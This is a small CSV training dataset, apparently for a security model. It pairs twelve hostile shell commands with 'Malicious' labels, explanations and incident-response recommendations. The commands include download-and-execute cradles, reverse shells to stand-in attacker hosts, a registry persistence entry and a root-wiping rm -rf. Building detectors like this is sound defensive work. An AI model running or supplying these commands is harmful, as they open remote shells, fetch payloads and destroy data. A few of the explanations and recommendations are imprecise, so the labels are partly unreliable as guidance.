input_text,target_text
analyze: curl http://malicious-domain.biz/malware.sh | bash,"Malicious - Downloads and executes a script from an untrusted domain, often used in initial access attacks. Recommendation: Terminate the process, isolate the system, and scan for persistence mechanisms."
analyze: powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1'),"Malicious - PowerShell obfuscation used to download and execute remote code, typical of fileless malware. Recommendation: Disable PowerShell execution policy and audit script block logging."
analyze: rm -rf --no-preserve-root /,"Malicious - Command attempts to delete all files on the system, which is destructive. Recommendation: Immediately stop execution and restore from backups."
analyze: wget http://attacker.site/backdoor.py -O /tmp/backdoor.py && python3 /tmp/backdoor.py,Malicious - Downloads and runs a Python script that could be a remote access tool. Recommendation: Check for reverse shell activity and delete the file.
analyze: scp attacker@192.168.1.100:/root/.ssh/id_rsa ~/.ssh/,"Malicious - Copies a private SSH key from an attacker machine, which can be used for lateral movement. Recommendation: Revoke any exposed SSH keys and rotate credentials immediately."
analyze: nc -e /bin/bash attacker.com 4444,Malicious - Creates a reverse shell to an external attacker host. Recommendation: Block the IP and investigate system compromise.
"analyze: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d ""powershell -nop -c IEX(...)""",Malicious - Persists a malicious PowerShell payload using Windows registry autorun. Recommendation: Inspect registry for unauthorized entries and monitor persistence.
analyze: mshta http://malicious-site.com/payload.hta,"Malicious - Uses mshta to execute remote malicious script, commonly used in phishing. Recommendation: Block mshta if not used and inspect network logs for the domain."
analyze: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1,Malicious - Creates a reverse shell using bash and redirects input/output to attacker. Recommendation: Inspect outbound connections and terminate unauthorized shells.
analyze: certutil -urlcache -split -f http://malicious.site/payload.exe payload.exe,"Malicious - Uses certutil to download a binary, often abused by attackers to bypass AV. Recommendation: Block certutil in user context and investigate file origin."
"analyze: python3 -c 'import pty; pty.spawn(""/bin/bash"")'",Malicious - Common technique used in privilege escalation after initial shell access. Recommendation: Audit who ran the command and inspect system for lateral movement.
analyze: Invoke-WebRequest -Uri http://badserver.com/mal.ps1 -OutFile mal.ps1; ./mal.ps1,Malicious - Downloads and executes a PowerShell script from a suspicious domain. Recommendation: Check script content and remove it; disable Invoke-WebRequest if unnecessary.
